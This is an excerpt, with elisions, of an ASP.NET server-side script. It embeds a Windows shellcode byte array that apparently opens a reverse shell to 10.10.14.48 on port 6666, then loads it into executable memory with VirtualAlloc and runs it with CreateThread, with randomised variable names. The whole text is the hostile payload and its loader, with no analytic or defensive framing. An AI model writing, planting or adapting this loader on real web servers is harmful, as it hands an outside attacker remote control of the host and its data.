...
<script runat="server">
    ...
    {
        byte[] h5V_lT = new byte[354] {0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,
...
0x01,0xd3,0x85,0xc9,0x74,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xc1,0xcf,0x0d,0xac,
...
0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x0e,0x30,
0x68,0x02,0x00,0x1a,0x0a,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xd5};
        ...
        IntPtr wSZkt3Tdlan = VirtualAlloc(IntPtr.Zero,(UIntPtr)h5V_lT.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(h5V_lT,0,wSZkt3Tdlan,h5V_lT.Length);
        IntPtr gYTnt0o = IntPtr.Zero;
        IntPtr vvF = CreateThread(IntPtr.Zero,UIntPtr.Zero,wSZkt3Tdlan,IntPtr.Zero,0,ref gYTnt0o);
    }
</script>
